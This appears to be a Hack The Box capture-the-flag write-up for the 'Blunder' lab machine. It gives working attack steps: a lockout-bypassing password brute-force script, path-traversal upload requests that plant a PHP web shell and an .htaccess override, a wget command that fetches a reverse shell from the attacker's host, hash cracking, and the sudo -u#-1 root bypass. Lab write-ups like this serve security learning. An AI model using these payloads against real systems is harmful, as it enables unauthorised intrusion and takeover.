---
title: "Blunder : HTB writeup"
last_modified_at: 2021-02-13
categories:
  - HTB
author_profile: false
tags:
  - Linux Privilege Escalation
  - File Upload Vulnerability
  - Password Bruteforce
  - Custom Wordlist
  - Sudo CVE
  - HTB
  - Writeup
---


This box is all about enumeration .

![](https://cdn-images-1.medium.com/max/2000/1*WHaIIhYpuw6kRdIcxsYBNQ.png)

Summary

* Directory busting to get the admin portal and todo.txt file.

* Brute force password.

* Exploit the file upload vulnerability to get the shell.

* Enumerate the machine to escalate privilege.

* Find exploits to bypass the restricted ability.

## Nmap

    # nmap -T4 -p- -A -o nmap 10.10.10.191
    Nmap scan report for 10.10.10.191
    Host is up (0.16s latency).
    Not shown: 65533 filtered ports
    PORT   STATE  SERVICE VERSION
    **21/tcp closed ftp
    80/tcp open   http**    Apache httpd 2.4.41 ((Ubuntu))
    |_http-generator: Blunder
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Blunder | A blunder of interesting facts
    Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Infomir MAG-250 set-top box (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Linux 3.7 (90%), Ubiquiti AirOS 5.5.9 (90%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.0 - 3.2 (89%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops

    -T4 : 4 threads
    -p- : scan all the ports
    -A  : OS detection, version detection, traceroute
    -o  : Output scan result if file

Here we can see port 80 is open and 21 is closed.

## Port 80

![](https://cdn-images-1.medium.com/max/2304/1*DD4PHBK6wf_8olkpGtVWrA.png)

There is not much on the website itself. The about section has a bit of information “ I created this site to dump my fact files, nothing more “

### Directory busting

Directory busting with gobuster with these arguments

    $ gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://10.10.10.191](http://10.10.10.191) -x php,txt -o dirs
    /about (Status: 200)
    /0 (Status: 200)
    /admin (Status: 301)
    /install.php (Status: 200)
    /empty (Status: 200)
    /robots.txt (Status: 200)
    /todo.txt (Status: 200)
    /usb (Status: 200)
    /LICENSE (Status: 200)

    -w : wordlist
    -u : URL
    -x : File extension to search for
    -o : Output file to write results

**/admin**

![](https://cdn-images-1.medium.com/max/2000/1*Xfx8KQYhAiLAd1xR_u49KQ.png)

**Todo.txt**

    -Update the CMS
    -Turn off FTP - DONE
    -Remove old users - DONE
    -Inform **fergus** that the new blog needs images - PENDING

Here **fergus** could be a potential username.

First I manually tried brute-forcing the username with password, then got IP blocked message. On googling for BLUDIT vulnerabilities, we can find IP blocking bypass exploits.

Used [this](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) to brute force for passwords. First I used rockyou.txt, but could not find the password. Since the about page said, “ I created this site to dump my fact files, nothing more”. So I thought of creating a wordlist from the site.

**Created a custom wordlist using cewl**

    $ cewl -w ro.txt [http://10.10.10.191](http://10.10.10.191)

Then modified script from [this](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) to fit our purpose to Bruteforce the credentials.

    #!/usr/bin/env python3
    import re
    import requests

    host = '[**http://10.10.10.191'](http://10.10.10.191')**
    login_url = host + **'/admin/'**
    username = **'fergus'**
    wordlist = []

    # Generate 50 incorrect passwords
    #for i in range(50):
    #    wordlist.append('Password{i}'.format(i = i))

    # Add the correct password to the end of the list
    #wordlist.append('adminadmin')
    **f=open("wordlists")
    for data in f.readlines():
     wordlist.append(data.strip())**

    for password in wordlist:
        session = requests.Session()
        login_page = session.get(login_url)
        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
            'X-Forwarded-For': password,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Referer': login_url
        }

    data = {
            'tokenCSRF': csrf_token,
            'username': username,
            'password': password,
            'save': ''
        }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
            if '/admin/dashboard' in login_result.headers['location']:
                print()
                print('SUCCESS: Password found!')
                print('Use {u}:{p} to login.'.format(u = username, p = password))
                print()
                break

On running this we get the credentials

    fergus : RolandDeschain
    

To determine the version of Bludit running, visiting

    http://10.10.10.191/admin/about

![](https://cdn-images-1.medium.com/max/2000/1*QJT9KvOAmEbNn68Mbfnn-g.png)

We get version 3.9.2. Googling this we can find RCE vulnerability present in this version.

Followed this [https://github.com/bludit/bludit/issues/1081](https://github.com/bludit/bludit/issues/1081) issue on Github to get RCE.

First, create new content, and add an image

![](https://cdn-images-1.medium.com/max/2000/1*yeAE1chtuZR94g5j24zVRA.png)

On uploading an image, it sends a post request with image data

    POST /admin/ajax/upload-images HTTP/1.1
    Host: 10.10.10.191
    Content-Length: 27550
    Accept: */*
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvdbAfQfvdjrTLooA
    Origin: [http://10.10.10.191](http://10.10.10.191)
    Referer: [http://10.10.10.191/admin/new-content](http://10.10.10.191/admin/new-content)
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9,fr;q=0.8
    Cookie: BLUDIT-KEY=q5604mab2r7h11hua34crtng26
    Connection: close

    ------WebKitFormBoundaryvdbAfQfvdjrTLooA
    Content-Disposition: form-data; name="images[]"; filename="bear.jpg"
    Content-Type: image/jpeg

    **//imagedata**
    ------WebKitFormBoundaryvdbAfQfvdjrTLooA
    Content-Disposition: form-data; name="**uuid**"

    7f974f44bd782ce95b7822da7bfea72a
    ------WebKitFormBoundaryvdbAfQfvdjrTLooA
    Content-Disposition: form-data; name="tokenCSRF"

    3932e46b872ca59f022dd197c1b03b60b9f0d2c0
    ------WebKitFormBoundaryvdbAfQfvdjrTLooA--

Here **uuid** is the directory where the uploaded files are stored.

    http://10.10.10.191/bl-content/uploads/pages/uuid-value

If uuid is set to ../../tmp/temp, the file gets uploaded to

    http://10.10.10.191/bl-content/tmp/temp/

Now if we change the request to

    POST /admin/ajax/upload-images HTTP/1.1
    Host: 10.10.10.191
    Content-Length: 456
    Accept: */*
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvdbAfQfvdjrTLooA
    Origin: [http://10.10.10.191](http://10.10.10.191)
    Referer: [http://10.10.10.191/admin/new-content](http://10.10.10.191/admin/new-content)
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9,fr;q=0.8
    Cookie: BLUDIT-KEY=q5604mab2r7h11hua34crtng26
    Connection: close

    ------WebKitFormBoundaryvdbAfQfvdjrTLooA
    Content-Disposition: form-data; name="images[]"; filename="evil.jpg"
    Content-Type: image/jpeg

    **<?php system($_GET['cmd'])'?>**
    ------WebKitFormBoundaryvdbAfQfvdjrTLooA
    Content-Disposition: form-data; name="uuid"

    **../../tmp/temp**
    ------WebKitFormBoundaryvdbAfQfvdjrTLooA
    Content-Disposition: form-data; name="tokenCSRF"

    3932e46b872ca59f022dd197c1b03b60b9f0d2c0
    ------WebKitFormBoundaryvdbAfQfvdjrTLooA--

We get

    HTTP/1.1 200 OK
    Date: Thu, 13 Aug 2020 17:00:04 GMT
    Server: Apache/2.4.41 (Ubuntu)
    Expires: Thu, 19 Nov 1981 08:52:00 GMT
    Cache-Control: no-store, no-cache, must-revalidate
    Pragma: no-cache
    Content-Length: 63
    Connection: close
    Content-Type: application/json

    {"status":0,"message":"Images uploaded.","images":["evil.jpg"]}

It is uploaded but is not accessible

![](https://cdn-images-1.medium.com/max/2000/1*i2fLFoM7qUJrxSR1y2zjNQ.png)

Following the exploit, we need to add .htaccess file with

    POST /admin/ajax/upload-images HTTP/1.1
    Host: 10.10.10.191
    Content-Length: 456
    Accept: */*
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvdbAfQfvdjrTLooA
    Origin: [http://10.10.10.191](http://10.10.10.191)
    Referer: [http://10.10.10.191/admin/new-content](http://10.10.10.191/admin/new-content)
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9,fr;q=0.8
    Cookie: BLUDIT-KEY=q5604mab2r7h11hua34crtng26
    Connection: close

    ------WebKitFormBoundaryvdbAfQfvdjrTLooA
    Content-Disposition: form-data; name="images[]"; filename="**.htaccess**"
    Content-Type: image/jpeg

    **RewriteEngine Off
    AddType application/x-httpd-php .jpg**
    ------WebKitFormBoundaryvdbAfQfvdjrTLooA
    Content-Disposition: form-data; name="uuid"

    ../../tmp/temp
    ------WebKitFormBoundaryvdbAfQfvdjrTLooA
    Content-Disposition: form-data; name="tokenCSRF"

    3932e46b872ca59f022dd197c1b03b60b9f0d2c0
    ------WebKitFormBoundaryvdbAfQfvdjrTLooA--

We get

    HTTP/1.1 200 OK
    Date: Thu, 13 Aug 2020 17:06:55 GMT
    Server: Apache/2.4.41 (Ubuntu)
    Expires: Thu, 19 Nov 1981 08:52:00 GMT
    Cache-Control: no-store, no-cache, must-revalidate
    Pragma: no-cache
    Content-Length: 92
    Connection: close
    Content-Type: application/json

    {"status":1,"message":"File type is not supported. Allowed types: gif, png, jpg, jpeg, svg"}

Even if we get file type not supported, we can access our payload. Now what this does is treats all .jpg as .php files as a result, we can execute our payload and get a shell.

    [http://10.10.10.191/bl-content/tmp/temp/evil.jpg?cmd=whoami](http://10.10.10.191/bl-content/tmp/temp/evil.jpg?cmd=whoami)

    www-data

Another approach was after adding the .htaccess if we added a .php file, the file type not supported error was returned. But the PHP file was could be seen in

    http://10.10.10.191/bl-content/tmp/uploaded-php-file

## Getting Shell

Hosted the file using python and downloading it in the machine.

    [http://10.10.10.191/bl-content/tmp/temp/evil.jpg?cmd=wget%2010.10.14.192:8000/sh.php](http://10.10.10.191/bl-content/tmp/temp/evil.jpg?cmd=wget%2010.10.14.192:8000/sh.php)

After downloading we can see the reverse shell on

![](https://cdn-images-1.medium.com/max/2000/1*8cdcnNOyiNh1ifjrLpnTvw.png)

On running sh.php we get the shell with user www-data

![](https://cdn-images-1.medium.com/max/2000/1*TS30n08yMv4pfAkyYTRZFw.png)

There are 3 users with shells: hugo, shaun and temp. But hugo has the user flag.

First enumerated using LinEnum.sh, could not find anything. The todo.txt found in the initial step tells us about FTP. And there is an FTP directory in /. But it was a rabbit hole. It had a gzip compressed file on decompressing we get a tar file, on decompressing that we get a .wav file. Thinking it had something to do with steganography, I used stegcracker to extract data from that file. Found the password “sophie” and data to be base64 encoded string on decoding it we get hex value. Converting it to ASCII, we again get a base64 encoded string and on decoding it we get “fergus”. Well, it was a rabbit hole.

If we check the /var/www directory, we can see multiple versions of bludit files.

    drwxr-xr-x  5 root     root     4096 Nov 28  2019 .
    drwxr-xr-x 15 root     root     4096 Nov 27  2019 ..
    drwxr-xr-x  8 www-data www-data 4096 May 19 15:13 bludit-3.10.0a
    drwxrwxr-x  8 www-data www-data 4096 Apr 28 12:18 bludit-3.9.2
    drwxr-xr-x  2 root     root     4096 Nov 28  2019 html

Since bludit stores the users in /bl-content/databases/users.php. On reading the 3.10.0a version file, we get the user hugo in there. The password is hashed.

    <?php defined('BLUDIT') or die('Bludit CMS.'); ?>
    {
        "admin": {
            "nickname": "Hugo",
            "firstName": "**Hugo**",
            "lastName": "",
            "role": "User",
            "password": "**faca404fd5c0a31cf1897b823c695c85cffeb98d**",
            "email": "",
            "registered": "2019-11-27 07:40:55",
            "tokenRemember": "",
            "tokenAuth": "b380cb62057e9da47afce66b4615107d",
            "tokenAuthTTL": "2009-03-15 14:00",
            "twitter": "",
            "facebook": "",
            "instagram": "",
            "codepen": "",
            "linkedin": "",
            "github": "",
            "gitlab": ""}
    }

Using [crackstation](https://crackstation.net/) to get the plain text password.

![](https://cdn-images-1.medium.com/max/2000/1*51zKGq3fjKaanX0ExQEpdA.png)

Switched to user hugo and got the user.

    $ su hugo
    Password : Password123
    $ /bin/bash
    hugo@blunder:~$ wc user.txt
    1    1   33    user.txt

## Root

![](https://cdn-images-1.medium.com/max/2000/1*efkp3J4nAnp9NLaM-LFOXQ.png)

So user hugo can run /bin/bash on all users except root.

First I tried to find if any user was in the root group but could not find any. So on googling around we can find [this](https://www.exploit-db.com/exploits/47502).

Following the exploit

    hugo@blunder:~$ sudo -u#-1 /bin/bash
    sudo -u#-1 /bin/bash
    root@blunder:/home/hugo#

**Why did this work?**

![](https://cdn-images-1.medium.com/max/2000/1*RpynCAicL9FJr6meTS04Tw.png)

With this, I got the root access to the machine as well.

The initial foothold to the machine was a bit difficult. After getting into the machine, the automated tools didn’t give much information. The privilege escalation part was totally new to me. As a whole, this machine was fun to exploit.

Thank you for reading the writeup. Hope you find it insightful and feel free to comment if you think something could be done differently.
